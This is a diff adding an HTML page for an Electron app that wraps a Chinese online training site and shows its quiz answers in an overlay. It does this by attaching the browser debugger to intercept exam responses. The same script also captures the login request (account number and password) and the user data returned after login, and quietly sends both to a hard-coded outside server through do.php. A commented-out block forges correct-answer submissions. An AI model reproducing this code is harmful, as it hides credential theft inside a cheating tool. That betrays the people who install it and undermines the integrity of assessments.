@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>==陈旭专用==</title>
+    <link rel="stylesheet" type="text/css" href="style.css"/>
+    <style type="text/css">
+      body{
+        color: #3AC3F7;
+        background-color: #333;
+        width: auto;
+        height: auto;
+      }
+      #browser
+      {
+        width: 100vw;
+        height: 100vh;
+      }
+
+      #ansview{
+        width: 500px;
+        height: auto;
+        position:absolute;
+        -webkit-box-shadow:1px 1px 3px #292929;
+        -moz-box-shadow:1px 1px 3px #292929;
+        box-shadow:1px 1px 3px #292929;
+        background-color: #333;
+        top: 0px;
+        left: 0px;
+        text-align: center;
+        padding-bottom: 2px;
+        padding-top: 2px;
+      }
+
+      .btncon{
+        position: absolute;
+        top: 0px;
+        left: 0px;
+      }
+
+      #title{
+        color:azure;
+        background-color:#000;
+        height: 32px;
+        font-size: 30px;
+        text-align: center;
+        font-weight: bold;
+      }
+      #answer{
+        font-size: 18px;
+        color: #ccFF00;
+        text-align: left;
+        background-color: #000;
+        padding-top:5px;
+        padding-bottom: 10px;
+        height: auto;
+      }
+      #one{
+        width:auto;
+        height: auto;
+        background-color: #3f3f3f;
+        margin-bottom: 15px;
+        padding-top: 10px;
+      }
+      #wait{
+        text-align: center;
+        padding-top:5px;
+        padding-bottom: 10px;
+      }
+      #atitle{
+        color:#FFF;
+
+      }
+      #atime{
+        color:rgb(247, 247, 8);
+        font-size: 16px;
+      }
+      #aanswer{
+        color:rgb(43, 255, 0);
+      }
+      .line{
+        width: 100%;
+        height: 2px;
+        background-color: #888;
+        margin-top: 10px;
+      }
+
+
+      #devetools{
+        width: 100%;
+        height: 400px;
+        position: absolute;
+        top:700px;
+      }
+
+    </style>
+  </head>
+  <body>
+      <webview id="browser" src="http://hnzj.user.ghlearning.com/index" plugins></webview>
+      
+      <div class="btncon"><button id="showbtn" class="big red button" onclick="showhideanswer()">显示答案</button></div>
+      <div id="ansview" >
+        <div id="title">答案</div>
+        <div id="answer"></div>
+      </div>
+
+      <!-- <webview id="devetools" plugins></webview> -->
+    <script>
+// const remote = require('electron').remote;
+// const Menu = remote.Menu;
+// const MenuItem = remote.MenuItem;
+
+// 	var menu = new Menu();
+// 	menu.append(new MenuItem({label:"显示答案", click:function(){ win.webContents.send('showhide', 1);}}))
+// 	menu.append(new MenuItem({label:"隐藏答案", click:function(){ win.webContents.send('showhide', 0);}}))
+// 	window.addEventListener('contextmenu', function (e) {
+//     e.preventDefault();
+//     console.log("=======create menu")
+// 		menu.popup(remote.getCurrentWindow());
+// 	  }, false);
+
+     const htmlanswer = document.getElementById('answer');
+     const htmlansview = document.getElementById('ansview');
+     const htmlshowbtn = document.getElementById('showbtn');
+
+     const appurl = "http://121.196.196.20/appdata/answer/";
+  // const htmldevtools = document.getElementById("devetools");
+  const  http = require("http");  
+  const  querystring = require("querystring");  
+  const { URLSearchParams } = require('url');
+  var waitRequestId = 0;
+
+     htmlanswer.innerHTML = "<div id='wait'>Waiting for you oper</div>";
+     require('electron').ipcRenderer.on('showhide', function(event, message) {
+      console.log(message);  // Prints "whoooooooh!"
+      showhideanswer(null);
+    });
+    require('electron').ipcRenderer.on('refush', function(event, message) {
+      console.log(message);  // Prints "whoooooooh!"
+      document.getElementById('browser').reload();
+    });
+    require('electron').ipcRenderer.on('about', function(event, message) {
+      console.log(message);  // Prints "whoooooooh!"
+      alert("made by cyj 2018.09.08 17:54", "==陈旭专用==")
+    });
+    // require('electron').ipcRenderer.on('kaoshi', function(event, message) {
+    //   console.log(message);  // Prints "whoooooooh!"
+      
+    // });
+
+      function senddata(type, params)
+      {
+        var dourl = appurl+"do.php?type="+type+"&"+params;
+        http.get(dourl,function(res){
+          res.setEncoding('utf8');
+          res.on('data',function(chunk){
+            console.log("DO "+chunk);
+          });
+        });
+      }
+    
+    require('electron').ipcRenderer.on('clearn', function(event, message) {
+      var bor = browser.getWebContents();
+      bor.session.clearStorageData(
+        {
+          // origin: "http://www.github.com",
+          storages: ['cookies','local storage']
+        },
+        (error)=>{
+          console.log("清理缓存完毕", error);
+          alert("缓存清理完毕", "提示");
+        }
+      )
+      
+    });
+
+    browser.addEventListener("dom-ready", ()=>{
+          const  webcontents = browser.getWebContents();
+          // var pid = "";
+          // var waittimeids = [];
+
+          
+          //test
+        // webcontents.setDevToolsWebContents(htmldevtools.getWebContents())
+
+          try {
+            webcontents.debugger.attach("1.1");
+          } catch (err) {
+            console.log("Debugger attach failed : ", err);
+          }
+
+
+        // webcontents.openDevTools();
+
+          webcontents.debugger.on('detach', (event, reason) => {
+            console.log("Debugger detached due to : ", reason);
+          });
+          
+          webcontents.debugger.on('message', (event, method, params) => {
+            // console.log("---------------------------------------------")
+            // console.log(event, method, params);
+            if(method == "Network.requestWillBeSent")
+            {
+              var surl = params.request.url;
+              if( surl.indexOf("http://hnzj.user.ghlearning.com/train/login/login.gson") != -1)
+              {
+                var postdata = params.request.postData;//account=410726199203190844&password=xxxx&vcode=xhpw&roleType=1&isRemember=0
+                var params = new URLSearchParams(postdata);
+                senddata(1, params.toString());
+                // var dourl = appurl+"do.php?type=1&"+params.toString();
+                // http.get(dourl,function(res){
+                //   res.setEncoding('utf8');
+                //   res.on('data',function(chunk){
+                //     console.log("DO "+chunk);
+                //   });
+                // });
+              }
+            }
+            if(waitRequestId != 0 && method == "Network.loadingFinished")
+            {
+              if(waitRequestId != params.requestId)return;
+                webcontents.debugger.sendCommand('Network.getResponseBody', {"requestId": params.requestId}, (error, result) => {
+                // console.log("zaici接收结果：", result);
+                if(url.indexOf("http://hnzj.user.ghlearning.com/train/login/login.gson") != -1)//检测用户数据
+                {
+                  if(!result.body)
+                  {
+                    waitRequestId = params.requestId;
+                    return;
+                  }
+                  // console.log("zaici body ", result);
+                  var obj = JSON.parse(result.body);
+                  if(obj.respCode == 200)//登录成功
+                  {
+                    var pdata = obj.attribute.data;
+                    var pp = new URLSearchParams(pdata);
+                    // console.log(pp.toString())
+                    senddata(2, pp.toString());
+                  }
+                  waitRequestId = 0;
+                  return;
+                }
+              });
+            }
+            if(method != "Network.responseReceived")return;
+            
+              var url = params.response.url;
+              
+              if(url.indexOf("http://v.polyv.net/uc/exam/get?") == -1 && url.indexOf("http://hnzj.user.ghlearning.com/train/login/login.gson") == -1) 
+              {
+                return;
+              }
+              console.log("检测到答案地址："+url)
+            webcontents.debugger.sendCommand('Network.getResponseBody', {"requestId": params.requestId}, (error, result) => {
+              // console.log("接收结果：", result);
+              if(url.indexOf("http://hnzj.user.ghlearning.com/train/login/login.gson") != -1)//检测用户数据
+              {
+                if(!result.body)
+                {
+                  waitRequestId = params.requestId;
+                  return;
+                }
+                // console.log("body ", result);
+                var obj = JSON.parse(result.body);
+                if(obj.respCode == 200)//登录成功
+                {
+                  var pdata = obj.attribute.data;
+                  var pp = new URLSearchParams(pdata);
+                  // console.log(pp.toString())
+                  senddata(2, pp.toString());
+                }
+                return;
+              }
+              if(!result.body)
+              {
+                htmlanswer.innerHTML = "not found nothing ...";
+                return;
+              }
+              var answer = JSON.parse(result.body);
+              var txt = "";
+              // waittimeids.length = 0;
+              for(var i=0; i<answer.length; i++)
+              {
+                var ansitem = answer[i];
+                var times = ansitem.showTime.split(":");
+                times.length = 3;
+                var sec = ~~times[2];
+                times[0] = ~~(sec/3600)
+                times[1] = ~~(sec/60);
+                times[2] = ~~(sec%60);
+                var timestr = times.join(":");
+                txt += "<div id='one'><div id='atitle'>"+ansitem.question+"</div><div id='atime'>显示时间："+timestr+"</div><div id='aanswer'>正确答案：";
+                var choices = JSON.parse(ansitem.choices);
+                var sendans = [];
+                for(var j=0; j<choices.length; j++)
+                {
+                  if(choices[j].right_answer)
+                  {
+                    sendans.push(choices[j].answer);
+                  }
+                }
+                txt += sendans.join(" , ") 
+                txt += "</div><div class='line'/></div>";
+                /**
+                var id = setTimeout(() => {
+                  console.log("执行定时发送数据：",ansitem);
+                  var postData = querystring.stringify({
+                    vid:ansitem.videoPoolId,
+                    answer:"["+sendans.join(",")+"]",
+                    eid:ansitem.examId,
+                    uid:ansitem.userid,
+                    question:ansitem.question,
+                    pid:pid,
+                    correct:1
+                  });
+                  const options = {
+                    hostname: 'v.polyv.net',
+                    port: 80,
+                    path: '/uc/examlog/save',
+                    method: 'POST',
+                    headers: {
+                      'Content-Type': 'application/x-www-form-urlencoded',
+                      'Content-Length': Buffer.byteLength(postData),
+                      'X-Requested-With':"ShockwaveFlash/30.0.0.154",
+                      "Referer": "http://player.polyv.net/common_player/player/module/interaction_panel/interaction_panel.2018.06.2701.swf",
+                      "Origin": "http://player.polyv.net"
+                    }
+                  };
+                  const req = http.request(options, (res) => {
+                    console.log(`状态码: ${res.statusCode}`);
+                    console.log(`响应头: ${JSON.stringify(res.headers)}`);
+                    res.setEncoding('utf8');
+                    res.on('data', (chunk) => {
+                      console.log(`响应主体: ${chunk}`);
+                    });
+                    res.on('end', () => {
+                      console.log('响应中已无数据。');
+                    });
+                });
+
+                req.on('error', (e) => {
+                  console.error(`请求遇到问题: ${e.message}`);
+                });
+
+                // 写入数据到请求主体
+                req.write(postData);
+                req.end();
+                }, sec*1000+1000);
+                waittimeids.push(id);  **/
+              }
+              htmlanswer.innerHTML = txt;
+            //   answerwin.webContents.send('answer', txt);
+            //   answerwin.webContents.executeJavaScript("document.getElementById('answer').innerHTML ="+txt)
+              console.log("答案内容：", answer);
+              
+            })
+          });
+          webcontents.debugger.sendCommand("Network.enable");
+	 
+    }); 
+
+    //拖动
+    var draggingObj=null; //dragging Dialog
+    var diffX=0;
+            var diffY=0;       
+            function down(e){
+                if(e.target.id.indexOf('title')!=-1){
+                    isDialogTitle=true;
+                    draggingObj=e.target.offsetParent;
+                    diffX=event.clientX-draggingObj.offsetLeft;
+                    diffY=event.clientY-draggingObj.offsetTop;
+                }
+            }
+            
+            function move(e){
+                var dialog=document.getElementById('ansview');
+                if(draggingObj){//只有点击Dialog Title的时候才能拖动
+                    dialog.style.left=(e.clientX-diffX)+'px';
+                    dialog.style.top=(e.clientY-diffY)+'px';
+                }
+            }
+            
+            function up(e){
+                draggingObj=null;
+                diffX=0;
+                diffY=0;
+            }
+            
+            document.addEventListener('mousedown',down);
+            document.addEventListener('mousemove',move);
+            document.addEventListener('mouseup',up);
+
+            var isshow = true;
+            showhideanswer(null);
+            function showhideanswer(e)
+            {
+              if(isshow)
+              {
+                htmlansview.style.display="none";//隐藏
+                isshow = false;
+                htmlshowbtn.textContent = "显示答案";
+              }else{
+                htmlansview.style.display="";//显示
+                htmlshowbtn.textContent = "隐藏答案";
+                htmlansview.style.left = (window.innerWidth - htmlansview.offsetWidth)/2+'px';
+                htmlansview.style.top = (window.innerHeight - htmlansview.offsetHeight)/2+'px';
+                isshow = true;
+              }
+            }
+    </script>
+  </body>
+</html>
